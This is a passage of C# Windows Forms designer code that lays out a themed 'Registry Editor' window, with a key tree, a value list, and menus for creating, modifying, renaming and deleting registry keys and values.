        this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.selectedItem_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.modifyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyBinaryDataToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
        this.modifyToolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
        this.deleteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.renameToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.lst_ContextMenuStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.newToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.keyToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
        this.stringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.binaryValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.dWORD32bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.qWORD64bitValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.multiStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.expandableStringValueToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
        this.timer1 = new System.Windows.Forms.Timer(this.components);
        this.hopeForm1 = new ReaLTaiizor.Forms.HopeForm();
        this.tableLayoutPanel.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.splitContainer).BeginInit();
        this.splitContainer.Panel1.SuspendLayout();
        this.splitContainer.Panel2.SuspendLayout();
        this.splitContainer.SuspendLayout();
        this.statusStrip.SuspendLayout();
        this.menuStrip.SuspendLayout();
        this.tv_ContextMenuStrip.SuspendLayout();
        this.selectedItem_ContextMenuStrip.SuspendLayout();
        this.lst_ContextMenuStrip.SuspendLayout();
        base.SuspendLayout();
        this.tableLayoutPanel.BackColor = System.Drawing.Color.White;
        this.tableLayoutPanel.ColumnCount = 1;
        this.tableLayoutPanel.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 100f));
        this.tableLayoutPanel.Controls.Add(this.splitContainer, 0, 1);
        this.tableLayoutPanel.Controls.Add(this.statusStrip, 0, 2);
        this.tableLayoutPanel.Controls.Add(this.menuStrip, 0, 0);
        this.tableLayoutPanel.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tableLayoutPanel.GrowStyle = System.Windows.Forms.TableLayoutPanelGrowStyle.FixedSize;
        this.tableLayoutPanel.Location = new System.Drawing.Point(0, 40);
        this.tableLayoutPanel.Name = "tableLayoutPanel";
        this.tableLayoutPanel.RowCount = 3;
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 25f));
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
        this.tableLayoutPanel.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Absolute, 22f));
        this.tableLayoutPanel.Size = new System.Drawing.Size(784, 521);
        this.tableLayoutPanel.TabIndex = 0;
        this.splitContainer.Dock = System.Windows.Forms.DockStyle.Fill;
        this.splitContainer.Location = new System.Drawing.Point(3, 28);
        this.splitContainer.Name = "splitContainer";
        this.splitContainer.Panel1.Controls.Add(this.tvRegistryDirectory);
        this.splitContainer.Panel2.Controls.Add(this.lstRegistryValues);
        this.splitContainer.Size = new System.Drawing.Size(778, 468);
        this.splitContainer.SplitterDistance = 259;
        this.splitContainer.TabIndex = 0;
        this.tvRegistryDirectory.Dock = System.Windows.Forms.DockStyle.Fill;
        this.tvRegistryDirectory.HideSelection = false;
        this.tvRegistryDirectory.ImageIndex = 0;
        this.tvRegistryDirectory.ImageList = this.imageRegistryDirectoryList;
        this.tvRegistryDirectory.Location = new System.Drawing.Point(0, 0);
        this.tvRegistryDirectory.Name = "tvRegistryDirectory";
        this.tvRegistryDirectory.SelectedImageIndex = 0;
        this.tvRegistryDirectory.Size = new System.Drawing.Size(259, 468);
        this.tvRegistryDirectory.TabIndex = 0;
        this.tvRegistryDirectory.AfterLabelEdit += new System.Windows.Forms.NodeLabelEditEventHandler(tvRegistryDirectory_AfterLabelEdit);
        this.tvRegistryDirectory.BeforeExpand += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeExpand);
        this.tvRegistryDirectory.BeforeSelect += new System.Windows.Forms.TreeViewCancelEventHandler(tvRegistryDirectory_BeforeSelect);
        this.tvRegistryDirectory.NodeMouseClick += new System.Windows.Forms.TreeNodeMouseClickEventHandler(tvRegistryDirectory_NodeMouseClick);
        this.tvRegistryDirectory.KeyUp += new System.Windows.Forms.KeyEventHandler(tvRegistryDirectory_KeyUp);
        this.imageRegistryDirectoryList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryDirectoryList.ImageStream");
        this.imageRegistryDirectoryList.TransparentColor = System.Drawing.Color.Transparent;
        this.imageRegistryDirectoryList.Images.SetKeyName(0, "folder.png");
        this.lstRegistryValues.Columns.AddRange(new System.Windows.Forms.ColumnHeader[3] { this.hName, this.hType, this.hValue });
        this.lstRegistryValues.Dock = System.Windows.Forms.DockStyle.Fill;
        this.lstRegistryValues.FullRowSelect = true;
        this.lstRegistryValues.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.Nonclickable;
        this.lstRegistryValues.HideSelection = false;
        this.lstRegistryValues.Location = new System.Drawing.Point(0, 0);
        this.lstRegistryValues.Name = "lstRegistryValues";
        this.lstRegistryValues.Size = new System.Drawing.Size(515, 468);
        this.lstRegistryValues.SmallImageList = this.imageRegistryKeyTypeList;
        this.lstRegistryValues.TabIndex = 0;
        this.lstRegistryValues.UseCompatibleStateImageBehavior = false;
        this.lstRegistryValues.View = System.Windows.Forms.View.Details;
        this.lstRegistryValues.AfterLabelEdit += new System.Windows.Forms.LabelEditEventHandler(lstRegistryKeys_AfterLabelEdit);
        this.lstRegistryValues.KeyUp += new System.Windows.Forms.KeyEventHandler(lstRegistryKeys_KeyUp);
        this.lstRegistryValues.MouseUp += new System.Windows.Forms.MouseEventHandler(lstRegistryKeys_MouseClick);
        this.hName.Text = "Name";
        this.hName.Width = 173;
        this.hType.Text = "Type";
        this.hType.Width = 104;
        this.hValue.Text = "Value";
        this.hValue.Width = 214;
        this.imageRegistryKeyTypeList.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageRegistryKeyTypeList.ImageStream");
        this.imageRegistryKeyTypeList.TransparentColor = System.Drawing.Color.Transparent;
        this.imageRegistryKeyTypeList.Images.SetKeyName(0, "reg_string.png");
        this.imageRegistryKeyTypeList.Images.SetKeyName(1, "reg_binary.png");
        this.statusStrip.Dock = System.Windows.Forms.DockStyle.Fill;
        this.statusStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.selectedStripStatusLabel });
        this.statusStrip.Location = new System.Drawing.Point(0, 499);
        this.statusStrip.Name = "statusStrip";
        this.statusStrip.Size = new System.Drawing.Size(784, 22);
        this.statusStrip.TabIndex = 1;
        this.statusStrip.Text = "statusStrip";
        this.selectedStripStatusLabel.Name = "selectedStripStatusLabel";
        this.selectedStripStatusLabel.Size = new System.Drawing.Size(0, 17);
        this.menuStrip.Dock = System.Windows.Forms.DockStyle.None;
        this.menuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.fileToolStripMenuItem, this.editToolStripMenuItem });
        this.menuStrip.Location = new System.Drawing.Point(0, 0);
        this.menuStrip.Name = "menuStrip";
        this.menuStrip.Size = new System.Drawing.Size(84, 24);
        this.menuStrip.TabIndex = 2;
        this.fileToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.exitToolStripMenuItem });
        this.fileToolStripMenuItem.Name = "fileToolStripMenuItem";
        this.fileToolStripMenuItem.Size = new System.Drawing.Size(37, 20);
        this.fileToolStripMenuItem.Text = "File";
        this.exitToolStripMenuItem.Name = "exitToolStripMenuItem";
        this.exitToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
        this.exitToolStripMenuItem.Text = "Exit";
        this.exitToolStripMenuItem.Click += new System.EventHandler(menuStripExit_Click);
        this.editToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.modifyToolStripMenuItem1, this.modifyBinaryDataToolStripMenuItem1, this.modifyNewtoolStripSeparator, this.newToolStripMenuItem2, this.toolStripSeparator6, this.deleteToolStripMenuItem2, this.renameToolStripMenuItem2 });
        this.editToolStripMenuItem.Name = "editToolStripMenuItem";
        this.editToolStripMenuItem.Size = new System.Drawing.Size(39, 20);
        this.editToolStripMenuItem.Text = "Edit";
        this.editToolStripMenuItem.DropDownOpening += new System.EventHandler(editToolStripMenuItem_DropDownOpening);
        this.modifyToolStripMenuItem1.Enabled = false;
        this.modifyToolStripMenuItem1.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.modifyToolStripMenuItem1.Name = "modifyToolStripMenuItem1";
        this.modifyToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.modifyToolStripMenuItem1.Text = "Modify...";
        this.modifyToolStripMenuItem1.Visible = false;
        this.modifyToolStripMenuItem1.Click += new System.EventHandler(modifyRegistryValue_Click);
        this.modifyBinaryDataToolStripMenuItem1.Enabled = false;
        this.modifyBinaryDataToolStripMenuItem1.Name = "modifyBinaryDataToolStripMenuItem1";
        this.modifyBinaryDataToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.modifyBinaryDataToolStripMenuItem1.Text = "Modify Binary Data...";
        this.modifyBinaryDataToolStripMenuItem1.Visible = false;
        this.modifyBinaryDataToolStripMenuItem1.Click += new System.EventHandler(modifyBinaryDataRegistryValue_Click);
        this.modifyNewtoolStripSeparator.Name = "modifyNewtoolStripSeparator";
        this.modifyNewtoolStripSeparator.Size = new System.Drawing.Size(181, 6);
        this.modifyNewtoolStripSeparator.Visible = false;
        this.newToolStripMenuItem2.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem2, this.toolStripSeparator7, this.stringValueToolStripMenuItem2, this.binaryValueToolStripMenuItem2, this.dWORD32bitValueToolStripMenuItem2, this.qWORD64bitValueToolStripMenuItem2, this.multiStringValueToolStripMenuItem2, this.expandableStringValueToolStripMenuItem2 });
        this.newToolStripMenuItem2.Name = "newToolStripMenuItem2";
        this.newToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.newToolStripMenuItem2.Text = "New";
        this.keyToolStripMenuItem2.Name = "keyToolStripMenuItem2";
        this.keyToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem2.Text = "Key";
        this.keyToolStripMenuItem2.Click += new System.EventHandler(createNewRegistryKey_Click);
        this.toolStripSeparator7.Name = "toolStripSeparator7";
        this.toolStripSeparator7.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem2.Name = "stringValueToolStripMenuItem2";
        this.stringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem2.Text = "String Value";
        this.stringValueToolStripMenuItem2.Click += new System.EventHandler(createStringRegistryValue_Click);
        this.binaryValueToolStripMenuItem2.Name = "binaryValueToolStripMenuItem2";
        this.binaryValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem2.Text = "Binary Value";
        this.binaryValueToolStripMenuItem2.Click += new System.EventHandler(createBinaryRegistryValue_Click);
        this.dWORD32bitValueToolStripMenuItem2.Name = "dWORD32bitValueToolStripMenuItem2";
        this.dWORD32bitValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem2.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem2.Click += new System.EventHandler(createDwordRegistryValue_Click);
        this.qWORD64bitValueToolStripMenuItem2.Name = "qWORD64bitValueToolStripMenuItem2";
        this.qWORD64bitValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem2.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem2.Click += new System.EventHandler(createQwordRegistryValue_Click);
        this.multiStringValueToolStripMenuItem2.Name = "multiStringValueToolStripMenuItem2";
        this.multiStringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem2.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem2.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
        this.expandableStringValueToolStripMenuItem2.Name = "expandableStringValueToolStripMenuItem2";
        this.expandableStringValueToolStripMenuItem2.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem2.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem2.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
        this.toolStripSeparator6.Name = "toolStripSeparator6";
        this.toolStripSeparator6.Size = new System.Drawing.Size(181, 6);
        this.deleteToolStripMenuItem2.Enabled = false;
        this.deleteToolStripMenuItem2.Name = "deleteToolStripMenuItem2";
        this.deleteToolStripMenuItem2.ShortcutKeyDisplayString = "Del";
        this.deleteToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.deleteToolStripMenuItem2.Text = "Delete";
        this.deleteToolStripMenuItem2.Click += new System.EventHandler(menuStripDelete_Click);
        this.renameToolStripMenuItem2.Enabled = false;
        this.renameToolStripMenuItem2.Name = "renameToolStripMenuItem2";
        this.renameToolStripMenuItem2.Size = new System.Drawing.Size(184, 22);
        this.renameToolStripMenuItem2.Text = "Rename";
        this.renameToolStripMenuItem2.Click += new System.EventHandler(menuStripRename_Click);
        this.tv_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.newToolStripMenuItem, this.toolStripSeparator1, this.deleteToolStripMenuItem, this.renameToolStripMenuItem });
        this.tv_ContextMenuStrip.Name = "contextMenuStrip";
        this.tv_ContextMenuStrip.Size = new System.Drawing.Size(118, 76);
        this.newToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem, this.toolStripSeparator2, this.stringValueToolStripMenuItem, this.binaryValueToolStripMenuItem, this.dWORD32bitValueToolStripMenuItem, this.qWORD64bitValueToolStripMenuItem, this.multiStringValueToolStripMenuItem, this.expandableStringValueToolStripMenuItem });
        this.newToolStripMenuItem.Name = "newToolStripMenuItem";
        this.newToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
        this.newToolStripMenuItem.Text = "New";
        this.keyToolStripMenuItem.Name = "keyToolStripMenuItem";
        this.keyToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem.Text = "Key";
        this.keyToolStripMenuItem.Click += new System.EventHandler(createNewRegistryKey_Click);
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem.Name = "stringValueToolStripMenuItem";
        this.stringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem.Text = "String Value";
        this.stringValueToolStripMenuItem.Click += new System.EventHandler(createStringRegistryValue_Click);
        this.binaryValueToolStripMenuItem.Name = "binaryValueToolStripMenuItem";
        this.binaryValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem.Text = "Binary Value";
        this.binaryValueToolStripMenuItem.Click += new System.EventHandler(createBinaryRegistryValue_Click);
        this.dWORD32bitValueToolStripMenuItem.Name = "dWORD32bitValueToolStripMenuItem";
        this.dWORD32bitValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem.Click += new System.EventHandler(createDwordRegistryValue_Click);
        this.qWORD64bitValueToolStripMenuItem.Name = "qWORD64bitValueToolStripMenuItem";
        this.qWORD64bitValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem.Click += new System.EventHandler(createQwordRegistryValue_Click);
        this.multiStringValueToolStripMenuItem.Name = "multiStringValueToolStripMenuItem";
        this.multiStringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
        this.expandableStringValueToolStripMenuItem.Name = "expandableStringValueToolStripMenuItem";
        this.expandableStringValueToolStripMenuItem.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
        this.toolStripSeparator1.Name = "toolStripSeparator1";
        this.toolStripSeparator1.Size = new System.Drawing.Size(114, 6);
        this.deleteToolStripMenuItem.Enabled = false;
        this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
        this.deleteToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
        this.deleteToolStripMenuItem.Text = "Delete";
        this.deleteToolStripMenuItem.Click += new System.EventHandler(deleteRegistryKey_Click);
        this.renameToolStripMenuItem.Enabled = false;
        this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
        this.renameToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
        this.renameToolStripMenuItem.Text = "Rename";
        this.renameToolStripMenuItem.Click += new System.EventHandler(renameRegistryKey_Click);
        this.selectedItem_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.modifyToolStripMenuItem, this.modifyBinaryDataToolStripMenuItem, this.modifyToolStripSeparator1, this.deleteToolStripMenuItem1, this.renameToolStripMenuItem1 });
        this.selectedItem_ContextMenuStrip.Name = "selectedItem_ContextMenuStrip";
        this.selectedItem_ContextMenuStrip.Size = new System.Drawing.Size(185, 98);
        this.modifyToolStripMenuItem.Enabled = false;
        this.modifyToolStripMenuItem.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.modifyToolStripMenuItem.Name = "modifyToolStripMenuItem";
        this.modifyToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
        this.modifyToolStripMenuItem.Text = "Modify...";
        this.modifyToolStripMenuItem.Click += new System.EventHandler(modifyRegistryValue_Click);
        this.modifyBinaryDataToolStripMenuItem.Enabled = false;
        this.modifyBinaryDataToolStripMenuItem.Name = "modifyBinaryDataToolStripMenuItem";
        this.modifyBinaryDataToolStripMenuItem.Size = new System.Drawing.Size(184, 22);
        this.modifyBinaryDataToolStripMenuItem.Text = "Modify Binary Data...";
        this.modifyBinaryDataToolStripMenuItem.Click += new System.EventHandler(modifyBinaryDataRegistryValue_Click);
        this.modifyToolStripSeparator1.Name = "modifyToolStripSeparator1";
        this.modifyToolStripSeparator1.Size = new System.Drawing.Size(181, 6);
        this.deleteToolStripMenuItem1.Name = "deleteToolStripMenuItem1";
        this.deleteToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.deleteToolStripMenuItem1.Text = "Delete";
        this.deleteToolStripMenuItem1.Click += new System.EventHandler(deleteRegistryValue_Click);
        this.renameToolStripMenuItem1.Name = "renameToolStripMenuItem1";
        this.renameToolStripMenuItem1.Size = new System.Drawing.Size(184, 22);
        this.renameToolStripMenuItem1.Text = "Rename";
        this.renameToolStripMenuItem1.Click += new System.EventHandler(renameRegistryValue_Click);
        this.lst_ContextMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.newToolStripMenuItem1 });
        this.lst_ContextMenuStrip.Name = "lst_ContextMenuStrip";
        this.lst_ContextMenuStrip.Size = new System.Drawing.Size(99, 26);
        this.newToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.keyToolStripMenuItem1, this.toolStripSeparator4, this.stringValueToolStripMenuItem1, this.binaryValueToolStripMenuItem1, this.dWORD32bitValueToolStripMenuItem1, this.qWORD64bitValueToolStripMenuItem1, this.multiStringValueToolStripMenuItem1, this.expandableStringValueToolStripMenuItem1 });
        this.newToolStripMenuItem1.Name = "newToolStripMenuItem1";
        this.newToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
        this.newToolStripMenuItem1.Text = "New";
        this.keyToolStripMenuItem1.Name = "keyToolStripMenuItem1";
        this.keyToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.keyToolStripMenuItem1.Text = "Key";
        this.keyToolStripMenuItem1.Click += new System.EventHandler(createNewRegistryKey_Click);
        this.toolStripSeparator4.Name = "toolStripSeparator4";
        this.toolStripSeparator4.Size = new System.Drawing.Size(197, 6);
        this.stringValueToolStripMenuItem1.Name = "stringValueToolStripMenuItem1";
        this.stringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.stringValueToolStripMenuItem1.Text = "String Value";
        this.stringValueToolStripMenuItem1.Click += new System.EventHandler(createStringRegistryValue_Click);
        this.binaryValueToolStripMenuItem1.Name = "binaryValueToolStripMenuItem1";
        this.binaryValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.binaryValueToolStripMenuItem1.Text = "Binary Value";
        this.binaryValueToolStripMenuItem1.Click += new System.EventHandler(createBinaryRegistryValue_Click);
        this.dWORD32bitValueToolStripMenuItem1.Name = "dWORD32bitValueToolStripMenuItem1";
        this.dWORD32bitValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.dWORD32bitValueToolStripMenuItem1.Text = "DWORD (32-bit) Value";
        this.dWORD32bitValueToolStripMenuItem1.Click += new System.EventHandler(createDwordRegistryValue_Click);
        this.qWORD64bitValueToolStripMenuItem1.Name = "qWORD64bitValueToolStripMenuItem1";
        this.qWORD64bitValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.qWORD64bitValueToolStripMenuItem1.Text = "QWORD (64-bit) Value";
        this.qWORD64bitValueToolStripMenuItem1.Click += new System.EventHandler(createQwordRegistryValue_Click);
        this.multiStringValueToolStripMenuItem1.Name = "multiStringValueToolStripMenuItem1";
        this.multiStringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.multiStringValueToolStripMenuItem1.Text = "Multi-String Value";
        this.multiStringValueToolStripMenuItem1.Click += new System.EventHandler(createMultiStringRegistryValue_Click);
        this.expandableStringValueToolStripMenuItem1.Name = "expandableStringValueToolStripMenuItem1";
        this.expandableStringValueToolStripMenuItem1.Size = new System.Drawing.Size(200, 22);
        this.expandableStringValueToolStripMenuItem1.Text = "Expandable String Value";
        this.expandableStringValueToolStripMenuItem1.Click += new System.EventHandler(createExpandStringRegistryValue_Click);
        this.timer1.Interval = 2000;
        this.timer1.Tick += new System.EventHandler(timer1_Tick);
        this.hopeForm1.ControlBoxColorH = System.Drawing.Color.FromArgb(228, 231, 237);
        this.hopeForm1.ControlBoxColorHC = System.Drawing.Color.FromArgb(245, 108, 108);
        this.hopeForm1.ControlBoxColorN = System.Drawing.Color.Black;
        this.hopeForm1.Cursor = System.Windows.Forms.Cursors.Default;
        this.hopeForm1.Dock = System.Windows.Forms.DockStyle.Top;
        this.hopeForm1.Font = new System.Drawing.Font("Segoe UI", 12f);
        this.hopeForm1.ForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
        this.hopeForm1.Image = (System.Drawing.Image)resources.GetObject("hopeForm1.Image");
        this.hopeForm1.Location = new System.Drawing.Point(0, 0);
        this.hopeForm1.MaximizeBox = false;
        this.hopeForm1.Name = "hopeForm1";
        this.hopeForm1.Size = new System.Drawing.Size(784, 40);
        this.hopeForm1.TabIndex = 3;
        this.hopeForm1.Text = "Registry Editor";
        this.hopeForm1.ThemeColor = System.Drawing.Color.White;
        this.hopeForm1.Click += new System.EventHandler(hopeForm1_Click);
        base.AutoScaleDimensions = new System.Drawing.SizeF(96f, 96f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Dpi;
        base.ClientSize = new System.Drawing.Size(784, 561);
        base.Controls.Add(this.tableLayoutPanel);
        base.Controls.Add(this.hopeForm1);
        this.Font = new System.Drawing.Font("Segoe UI", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.ForeColor = System.Drawing.Color.Black;
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.MainMenuStrip = this.menuStrip;
        base.MaximizeBox = false;
        this.MaximumSize = new System.Drawing.Size(1920, 1080);
        this.MinimumSize = new System.Drawing.Size(190, 40);
        base.Name = "FormRegistryEditor";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "Registry Editor []";
        base.Load += new System.EventHandler(FrmRegistryEditor_Load);
        this.tableLayoutPanel.ResumeLayout(false);
        this.tableLayoutPanel.PerformLayout();
        this.splitContainer.Panel1.ResumeLayout(false);
        this.splitContainer.Panel2.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.splitContainer).EndInit();
        this.splitContainer.ResumeLayout(false);
        this.statusStrip.ResumeLayout(false);
        this.statusStrip.PerformLayout();
        this.menuStrip.ResumeLayout(false);
        this.menuStrip.PerformLayout();
        this.tv_ContextMenuStrip.ResumeLayout(false);
        this.selectedItem_ContextMenuStrip.ResumeLayout(false);
        this.lst_ContextMenuStrip.ResumeLayout(false);
        base.ResumeLayout(false);
    }
}